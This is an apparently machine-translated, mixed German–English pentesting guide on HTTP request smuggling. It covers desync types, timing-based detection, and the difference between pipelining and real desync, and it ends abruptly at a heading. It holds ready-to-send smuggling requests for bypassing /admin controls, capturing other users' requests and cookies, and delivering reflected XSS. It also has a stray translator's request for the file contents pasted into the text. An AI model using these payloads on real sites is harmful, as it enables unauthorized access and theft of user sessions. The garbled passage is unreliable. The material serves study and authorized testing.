# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Was ist

Diese Schwachstelle tritt auf, wenn eine **Desynchronisation** zwischen **front-end proxies** und dem **back-end** Server es einem **Angreifer** erlaubt, eine HTTP **request** zu **senden**, die von den **front-end** proxies (load balance/reverse-proxy) als **eine Anfrage** und vom **back-end** Server **als 2 request** interpretiert wird.\
Das ermöglicht einem Benutzer, die nächste request, die nach seiner beim back-end Server ankommt, zu verändern.

### Theorie

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Realität

Das **Front-End** (ein Load-Balancer / Reverse Proxy) verarbeitet den _**content-length**_ oder den _**transfer-encoding**_ Header und der **Back-end** Server verarbeitet den anderen, was eine **Desynchronisation** zwischen den beiden Systemen hervorruft.\
Das kann sehr kritisch sein, da **ein Angreifer eine request** an den Reverse Proxy senden kann, die vom **back-end** Server **als 2 verschiedene requests** interpretiert wird. Die **Gefahr** dieser Technik liegt darin, dass der **back-end** Server die **2. injizierte request** so interpretieren wird, als stamme sie **vom nächsten Client**, und die **echte request** dieses Clients Teil der **injizierten request** wird.

### Besonderheiten

Denke daran, dass in HTTP **ein Newline-Zeichen aus 2 Bytes besteht:**

- **Content-Length**: Dieser Header verwendet eine **dezimale Zahl**, um die **Anzahl** der **Bytes** des **Bodys** der request anzugeben. Der Body wird erwartet, im letzten Zeichen zu enden, **ein Newline am Ende der Anfrage ist nicht erforderlich**.
- **Transfer-Encoding:** Dieser Header verwendet im **Body** eine **hexadezimale Zahl**, um die **Anzahl** der **Bytes** des **nächsten Chunks** anzugeben. Der **Chunk** muss mit einem **Newline** enden, aber dieses Newline wird **nicht** von der Längenangabe mitgezählt. Diese Transfer-Methode muss mit einem **Chunk der Größe 0 gefolgt von 2 Newlines** enden: `0`
- **Connection**: Nach meiner Erfahrung ist es empfehlenswert, beim ersten Request des Request Smugglings **`Connection: keep-alive`** zu verwenden.

### Visible - Hidden

Das Hauptproblem bei http/1.1 ist, dass alle requests über denselben TCP-Socket laufen. Wenn also eine Diskrepanz zwischen zwei Systemen festgestellt wird, die requests empfangen, ist es möglich, eine request zu senden, die vom finalen Backend (oder sogar von Zwischenkomponenten) als 2 verschiedene requests (oder mehr) behandelt wird.

**[Dieser Blog-Post](https://portswigger.net/research/http1-must-die)** schlägt neue Wege vor, Desync-Angriffe auf ein System zu erkennen, die von WAFs nicht markiert werden. Dazu stellt er die Visible vs Hidden Verhaltensweisen vor. Das Ziel ist in diesem Fall, Diskrepanzen in den Antworten zu finden mit Techniken, die Desyncs verursachen könnten, ohne tatsächlich etwas auszunutzen.

Zum Beispiel: Wenn eine request mit dem normalen Host-Header und einem " host"-Header gesendet wird — und das Backend sich über diese Anfrage beschwert (vielleicht weil der Wert von " host" falsch ist) — kann das darauf hindeuten, dass das Front-End den " host"-Header nicht gesehen hat, während das finale Backend ihn verwendet hat, was sehr wahrscheinlich eine Desynchronisation zwischen Front-End und Back-end impliziert.

Das wäre eine **Hidden-Visible discrepancy**.

Wenn das Front-End den " host"-Header berücksichtigt hätte, das Front-End es aber nicht tat, wäre das eine **Visible-Hidden** Situation.

Zum Beispiel ermöglichte dies die Entdeckung von Desyncs zwischen AWS ALB als Front-End und IIS als Backend. Das lag daran, dass beim Senden von "Host: foo/bar" der ALB `400, Server; awselb/2.0` zurückgab, aber beim Senden von "Host : foo/bar" `400, Server: Microsoft-HTTPAPI/2.0` zurückgegeben wurde, was darauf hindeutete, dass das Backend die Antwort geschickt hat. Das ist eine Hidden-Visible (H-V) Situation.

Beachte, dass diese Situation bei AWS nicht korrigiert ist, aber sie kann verhindert werden, indem man `routing.http.drop_invalid_header_fields.enabled` und `routing.http.desync_mitigation_mode = strictest` setzt.

## Grundlegende Beispiele

> [!TIP]
> Beim Versuch, dies mit Burp Suite auszunutzen, **deaktiviere `Update Content-Length` und `Normalize HTTP/1 line endings`** im Repeater, da manche Gadgets Newlines, Carriage Returns und malformed Content-Lengths ausnutzen.

HTTP request smuggling Angriffe werden durch das Senden ambiger Anfragen konstruiert, die Diskrepanzen in der Interpretation der Header `Content-Length` (CL) und `Transfer-Encoding` (TE) zwischen Front-End und Back-End ausnutzen. Diese Angriffe können in verschiedenen Formen auftreten, hauptsächlich als **CL.TE**, **TE.CL** und **TE.TE**. Jeder Typ repräsentiert eine einzigartige Kombination davon, wie Front-End und Back-End diese Header priorisieren. Die Verwundbarkeiten entstehen, weil die Server dieselbe Anfrage unterschiedlich verarbeiten, was zu unerwarteten und potenziell bösartigen Ergebnissen führen kann.

### Grundlegende Beispiele für Verwundbarkeitstypen

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> Zu der vorherigen Tabelle sollte die TE.0-Technik hinzugefügt werden, ähnlich wie die CL.0-Technik, aber mit Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length` Header.
- **Back-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding` Header.
- **Angriffsszenario:**

- Der Angreifer sendet eine Anfrage, bei der der Wert des `Content-Length` Headers nicht der tatsächlichen Inhaltslänge entspricht.
- Das Front-End leitet die gesamte Anfrage basierend auf dem `Content-Length` Wert an das Back-End weiter.
- Das Back-End verarbeitet die Anfrage als chunked wegen des `Transfer-Encoding: chunked` Headers und interpretiert die verbleibenden Daten als separate, nachfolgende request.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Verarbeitet die Anfrage basierend auf dem `Transfer-Encoding` Header.
- **Back-End (CL):** Verarbeitet die Anfrage basierend auf dem `Content-Length` Header.
- **Angriffsszenario:**

- Der Angreifer sendet eine chunked request, bei der die Chunk-Größe (`7b`) und die tatsächliche Inhaltslänge (`Content-Length: 4`) nicht übereinstimmen.
- Das Front-End, das `Transfer-Encoding` beachtet, leitet die gesamte Anfrage an das Back-End weiter.
- Das Back-End, das `Content-Length` respektiert, verarbeitet nur den anfänglichen Teil der Anfrage (`7b` Bytes) und lässt den Rest als Teil einer unbeabsichtigten nachfolgenden request übrig.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Beide unterstützen `Transfer-Encoding`, aber einer kann durch Obfuskation dazu gebracht werden, es zu ignorieren.
- **Angriffsszenario:**

- Der Angreifer sendet eine Anfrage mit obfuskierten `Transfer-Encoding` Headers.
- Je nachdem, welcher Server (Front-End oder Back-End) die Obfuskation nicht erkennt, kann eine CL.TE- oder TE.CL-Verwundbarkeit ausgenutzt werden.
- Der nicht verarbeitete Teil der Anfrage, wie er von einem der Server gesehen wird, wird Teil einer nachfolgenden Anfrage und führt so zu Smuggling.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Beide Server verarbeiten die Anfrage ausschließlich basierend auf dem `Content-Length` Header.
- Dieses Szenario führt typischerweise nicht zu Smuggling, da es eine Übereinstimmung in der Interpretation der Anfrage-Länge gibt.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Bezieht sich auf Szenarien, in denen der `Content-Length` Header vorhanden ist und einen Wert ungleich null hat, der anzeigt, dass der Request-Body Inhalt hat. Das Back-End ignoriert den `Content-Length` Header (der als 0 behandelt wird), aber das Front-End parst ihn.
- Das ist wichtig beim Verständnis und beim Erstellen von Smuggling-Angriffen, da es beeinflusst, wie Server das Ende einer Anfrage bestimmen.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Wie das vorherige, aber mit TE.
- Technik [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Beispiel**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Szenario

In einer `0.CL`-Situation wird eine Anfrage mit einer Content-Length wie folgt gesendet:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
Und das front-end berücksichtigt den `Content-Length` nicht, sodass es nur die erste request an das backend sendet (bis zur 7 im Beispiel). Das backend sieht jedoch den `Content-Length` und wartet auf einen Body, der nie ankommt, weil das front-end bereits auf die Antwort wartet.

Wenn es jedoch eine request gibt, die an das backend gesendet werden kann und die beantwortet wird, bevor der Body der request eingetroffen ist, tritt dieser Deadlock nicht auf. Bei IIS passiert das zum Beispiel, wenn man requests an verbotene Namen wie `/con` sendet (siehe die [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)). Auf diese Weise wird die initiale request direkt beantwortet und die zweite request wird die request des Opfers enthalten wie:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
Das ist nützlich, um eine desync zu verursachen, hat aber bisher keine Auswirkungen.

Der Beitrag bietet dafür jedoch eine Lösung, indem er eine **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)** umwandelt.

#### Den Webserver zum Absturz bringen

Diese Technik ist auch in Szenarien nützlich, in denen es möglich ist, einen Webserver **während des Einlesens der initialen HTTP-Daten zum Absturz zu bringen**, ohne **die Verbindung zu schließen**. Auf diese Weise wird der **Body** der HTTP-Anfrage als die **nächste HTTP-Anfrage** betrachtet.

Zum Beispiel, wie in [**this writeup**](https://mizu.re/post/twisty-python) erklärt, war es in Werkzeug möglich, einige **Unicode**-Zeichen zu senden, die den Server zum **Absturz** brachten. Wenn die HTTP-Verbindung jedoch mit dem Header **`Connection: keep-alive`** erstellt wurde, wird der Body der Anfrage nicht eingelesen und die Verbindung bleibt offen, sodass der **Body** der Anfrage als die **nächste HTTP-Anfrage** behandelt wird.

#### Erzwingen mittels hop-by-hop-Header

Durch das Missbrauchen von hop-by-hop-Headern können Sie den Proxy dazu veranlassen, den Header Content-Length oder Transfer-Encoding zu **löschen, sodass ein HTTP request smuggling ausgenutzt werden kann**.
```
Connection: Content-Length
```
Für **more information about hop-by-hop headers** siehe:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Erkennung von HTTP Request Smuggling

Die Identifizierung von Schwachstellen im Zusammenhang mit HTTP request smuggling kann oft mithilfe von Timing-Techniken erfolgen, bei denen beobachtet wird, wie lange der Server benötigt, um auf manipulierte Anfragen zu antworten. Diese Techniken sind besonders nützlich zum Aufspüren von CL.TE- und TE.CL-Schwachstellen. Neben diesen Methoden gibt es weitere Strategien und Tools, die zum Auffinden solcher Schwachstellen eingesetzt werden können:

### Finden von CL.TE-Schwachstellen mithilfe von Timing-Techniken

- **Methode:**

- Sende eine Anfrage, die, falls die Anwendung verwundbar ist, dazu führt, dass der Back-End-Server auf zusätzliche Daten wartet.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Beobachtung:**
- Der Front-End-Server verarbeitet die Anfrage basierend auf `Content-Length` und schneidet die Nachricht vorzeitig ab.
- Der Back-End-Server, der eine chunked message erwartet, wartet auf den nächsten Chunk, der nie ankommt, was eine Verzögerung verursacht.

- **Indikatoren:**
- Timeouts oder lange Verzögerungen in der Antwort.
- Empfang eines 400 Bad Request-Fehlers vom Back-End-Server, manchmal mit detaillierten Serverinformationen.

### Finden von TE.CL-Schwachstellen mithilfe von Timing-Techniken

- **Methode:**

- Sende eine Anfrage, die, falls die Anwendung verwundbar ist, dazu führt, dass der Back-End-Server auf zusätzliche Daten wartet.
- **Beispiel:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Beobachtung:**
- Der Front-End-Server verarbeitet die Anfrage basierend auf `Transfer-Encoding` und leitet die gesamte Nachricht weiter.
- Der Back-End-Server, der eine Nachricht basierend auf `Content-Length` erwartet, wartet auf zusätzliche Daten, die nie eintreffen, was eine Verzögerung verursacht.

### Weitere Methoden zum Auffinden von Schwachstellen

- **Differential Response Analysis:**
- Sende leicht veränderte Versionen einer Anfrage und beobachte, ob sich die Serverantworten unerwartet unterscheiden, was auf eine Parsing-Diskrepanz hindeutet.
- **Verwendung automatisierter Tools:**
- Tools wie Burp Suite's 'HTTP Request Smuggler' Erweiterung können automatisch auf diese Schwachstellen testen, indem sie verschiedene Formen ambiger Anfragen senden und die Antworten analysieren.
- **Content-Length-Varianztests:**
- Sende Anfragen mit unterschiedlichen `Content-Length`-Werten, die nicht mit der tatsächlichen Inhaltslänge übereinstimmen, und beobachte, wie der Server mit solchen Abweichungen umgeht.
- **Transfer-Encoding-Varianztests:**
- Sende Anfragen mit verschleierten oder fehlerhaften `Transfer-Encoding`-Headern und überwache, wie unterschiedlich Front-End- und Back-End-Server auf solche Manipulationen reagieren.

### Der `Expect: 100-continue`-Header

Überprüfe, wie dieser Header beim Ausnutzen einer HTTP-Desynchronisation helfen kann in:

{{#ref}}
../../network-services-pentesting/pentesting-web/special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Nachdem die Wirksamkeit der Timing-Techniken bestätigt wurde, ist es entscheidend zu prüfen, ob Client-Anfragen manipuliert werden können. Eine einfache Methode ist zu versuchen, deine Anfragen zu poisonen, zum Beispiel eine Anfrage an `/` so zu gestalten, dass sie eine 404-Antwort erzeugt. Die `CL.TE`- und `TE.CL`-Beispiele, die zuvor in [Basic Examples](#basic-examples) behandelt wurden, zeigen, wie man eine Client-Anfrage vergiften kann, um eine 404-Antwort zu erzwingen, obwohl der Client versucht, eine andere Ressource zu erreichen.

**Wichtige Überlegungen**

Beim Testen auf request smuggling-Schwachstellen durch Beeinflussung anderer Anfragen beachte:

- **Getrennte Netzwerkverbindungen:** Die "attack" und "normal" Requests sollten über separate Netzwerkverbindungen gesendet werden. Die Verwendung derselben Verbindung für beide bestätigt nicht das Vorhandensein der Schwachstelle.
- **Konsistente URL und Parameter:** Versuche, für beide Anfragen identische URLs und Parameternamen zu verwenden. Moderne Anwendungen leiten Requests oft basierend auf URL und Parametern an bestimmte Back-End-Server weiter. Übereinstimmung erhöht die Wahrscheinlichkeit, dass beide Anfragen vom selben Server verarbeitet werden, was Voraussetzung für einen erfolgreichen Angriff ist.
- **Timing- und Race-Bedingungen:** Die "normal" Anfrage, die dazu dient, eine Beeinflussung durch die "attack" Anfrage zu erkennen, konkurriert mit anderen gleichzeitigen Anfragen der Anwendung. Sende daher die "normal" Anfrage unmittelbar nach der "attack" Anfrage. Bei stark ausgelasteten Anwendungen können mehrere Versuche erforderlich sein, um die Schwachstelle eindeutig zu bestätigen.
- **Herausforderungen durch Load Balancing:** Front-End-Server, die als Load Balancer fungieren, können Anfragen auf verschiedene Back-End-Systeme verteilen. Wenn die "attack" und "normal" Requests auf unterschiedlichen Systemen landen, schlägt der Angriff fehl. Dieser Aspekt des Load Balancings kann mehrere Versuche zur Bestätigung einer Schwachstelle erfordern.
- **Unbeabsichtigte Auswirkungen auf Benutzer:** Wenn dein Angriff unbeabsichtigt die Anfrage eines anderen Benutzers (nicht die von dir gesendete "normal" Anfrage zur Erkennung) beeinflusst, zeigt das, dass dein Angriff einen anderen Anwender der Anwendung beeinflusst hat. Fortgesetzte Tests könnten andere Benutzer stören, daher ist Vorsicht geboten.

## Unterscheidung von HTTP/1.1-Pipelining-Artefakten vs echtem request smuggling

Connection-Reuse (keep-alive) und Pipelining können leicht Illusionen von "smuggling" in Test-Tools erzeugen, die mehrere Anfragen auf demselben Socket senden. Lerne, harmlose clientseitige Artefakte von echten serverseitigen Desynchronisationen zu unterscheiden.

### Warum Pipelining klassische False-Positives erzeugt

HTTP/1.1 verwendet eine einzelne TCP/TLS-Verbindung und hängt Anfragen und Antworten an denselben Stream an. Beim Pipelining sendet der Client mehrere Anfragen hintereinander und erwartet die Antworten in Reihenfolge. Ein häufiger False-Positive-Fall ist, eine malformed CL.0-style payload zweimal über eine einzelne Verbindung zu senden:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Ich habe den Pfad, aber nicht den Dateiinhalte. Bitte sende den Inhalt von src/pentesting-web/http-request-smuggling/README.md (oder kopiere den Text hier). Ich übersetze ihn dann ins Deutsche gemäß deinen Vorgaben.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Wenn der Server das fehlerhafte `Content_Length` ignorierte, gibt es keine FE↔BE desync. Bei Wiederverwendung sendete dein Client tatsächlich diesen Byte-Stream, den der Server als zwei unabhängige requests interpretierte:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: none. You just desynced your client from the server framing.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus tests: pipelining or real desync?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
- In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
- If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
2. HTTP/2 nested-response check
- Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
3. Partial-requests probe for connection-locked front-ends
- Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
- See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4. State probes
- Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
- Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5. Visualize the wire
- Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.

### Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
- Prove the server-side bug
- Use the HTTP/2 nested-response check, or
- Use partial-requests to show the FE only reuses upstream when the client does.
- Show real impact even if direct cross-user socket abuse is blocked:
- Cache poisoning: poison shared caches via the desync so responses affect other users.
- Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
- Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>
{{#endref}}

### Client‑side desync constraints

If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.

> [!NOTE]
> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.

Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Beim CL.TE-Angriff wird der `Content-Length`-Header für die initiale Anfrage ausgenutzt, während die anschließend eingebettete Anfrage den `Transfer-Encoding: chunked`-Header verwendet. Der Frontend-Proxy verarbeitet die initiale `POST`-Anfrage, prüft jedoch nicht die eingebettete `GET /admin`-Anfrage, wodurch ein unautorisierter Zugriff auf den Pfad `/admin` ermöglicht wird.

**TE.CL Beispiel**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Conversely, in the TE.CL attack, the initial `POST` request uses `Transfer-Encoding: chunked`, and the subsequent embedded request is processed based on the `Content-Length` header. Similar to the CL.TE attack, the front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.

### Aufdecken von Frontend-Anforderungsumschreibungen <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Applications often employ a **Front-End-Server** to modify incoming requests before passing them to the back-end server. A typical modification involves adding headers, such as `X-Forwarded-For: <IP of the client>`, to relay the client's IP to the back-end. Understanding these modifications can be crucial, as it might reveal ways to **bypass protections** or **uncover concealed information or endpoints**.

To investigate how a proxy alters a request, locate a POST parameter that the back-end echoes in the response. Then, craft a request, using this parameter last, similar to the following:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
In dieser Struktur werden nachfolgende Request-Komponenten nach `search=` angehängt, dem Parameter, der in der Antwort reflektiert wird. Diese Reflektion wird die Headers der nachfolgenden Request offenlegen.

Es ist wichtig, den `Content-Length` Header der verschachtelten Request an die tatsächliche Inhaltslänge anzupassen. Es empfiehlt sich, mit einem kleinen Wert zu beginnen und schrittweise zu erhöhen, da ein zu niedriger Wert die reflektierten Daten abschneiden wird, während ein zu hoher Wert dazu führen kann, dass die Request einen Fehler verursacht.

Diese Technik ist auch im Kontext einer TE.CL-Schwachstelle anwendbar, aber die Request sollte mit `search=\r\n0` enden. Unabhängig von den Newline-Zeichen werden die Werte an den search-Parameter angehängt.

Diese Methode dient hauptsächlich dazu, die vom front-end proxy vorgenommenen Request-Modifikationen zu verstehen und damit im Wesentlichen eine selbstgesteuerte Untersuchung durchzuführen.

### Requests anderer Benutzer erfassen <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es ist möglich, die Requests des nächsten Benutzers zu erfassen, indem man während einer POST-Operation eine spezifische Request als Wert eines Parameters anhängt. So kann das erreicht werden:

Indem man die folgende Request als Wert eines Parameters anhängt, kann man die Request des nachfolgenden Clients speichern:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
In diesem Szenario ist der **comment parameter** dafür vorgesehen, den Inhalt des Kommentarbereichs eines Posts auf einer öffentlich zugänglichen Seite zu speichern. Folglich erscheinen die Inhalte der anschließenden Anfrage als Kommentar.

Allerdings hat diese Technik Einschränkungen. Im Allgemeinen erfasst sie Daten nur bis zum Parametertrennzeichen, das in der smuggled request verwendet wird. Bei URL-encoded Formularübermittlungen ist dieses Trennzeichen das Zeichen `&`. Das bedeutet, dass der erfasste Inhalt aus der Anfrage des Opferbenutzers am ersten `&` endet, der sogar Teil der query string sein kann.

Außerdem ist erwähnenswert, dass dieser Ansatz auch bei einer TE.CL-Schwachstelle funktioniert. In solchen Fällen sollte die Anfrage mit `search=\r\n0` enden. Unabhängig von newline characters werden die Werte dem search parameter angehängt.

### Verwendung von HTTP request smuggling zur Ausnutzung von Reflected XSS

HTTP Request Smuggling kann genutzt werden, um Webseiten mit **Reflected XSS** anzugreifen, und bietet dabei erhebliche Vorteile:

- Eine Interaktion mit den Zielbenutzern ist **nicht erforderlich**.
- Es erlaubt die Ausnutzung von XSS in Teilen der Anfrage, die **normalerweise nicht erreichbar** sind, wie z. B. HTTP request headers.

In Szenarien, in denen eine Website gegenüber Reflected XSS über den User-Agent header verwundbar ist, demonstriert das folgende payload, wie diese Schwachstelle ausgenutzt werden kann:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
This payload is structured to exploit the vulnerability by:

1. Initiating a `POST` request, seemingly typical, with a `Transfer-Encoding: chunked` header to indicate the start of smuggling.
2. Following with a `0`, marking the end of the chunked message body.
3. Then, a smuggled `GET` request is introduced, where the `User-Agent` header is injected with a script, `<script>alert(1)</script>`, triggering the XSS when the server processes this subsequent request.

By manipulating the `User-Agent` through smuggling, the payload bypasses normal request constraints, thus exploiting the Reflected XSS vulnerability in a non-standard but effective manner.

#### HTTP/0.9

> [!CAUTION]
> Falls Benutzereingaben in einer Antwort mit einem **`Content-type`** wie **`text/plain`** reflektiert werden, verhindert das die Ausführung des XSS. Unterstützt der Server **HTTP/0.9**, könnte dies jedoch umgangen werden!

Die Version HTTP/0.9 war der Vorgänger von 1.0 und verwendet nur **GET**-Verben und antwortet **nicht** mit **headers**, sondern nur mit dem body.

In [**this writeup**](https://mizu.re/post/twisty-python) wurde dies mit request smuggling ausgenutzt, wobei ein **vulnerabler Endpoint, der mit der Eingabe des Benutzers antwortet**, genutzt wurde, um eine Anfrage im HTTP/0.9-Format einzuschleusen. Der Parameter, der in der Antwort reflektiert wurde, enthielt eine **fake HTTP/1.1 response (with headers and body)**, sodass die Antwort gültigen ausführbaren JS-Code mit einem `Content-Type` von `text/html` enthält.

### Ausnutzen von On-site Redirects mit HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

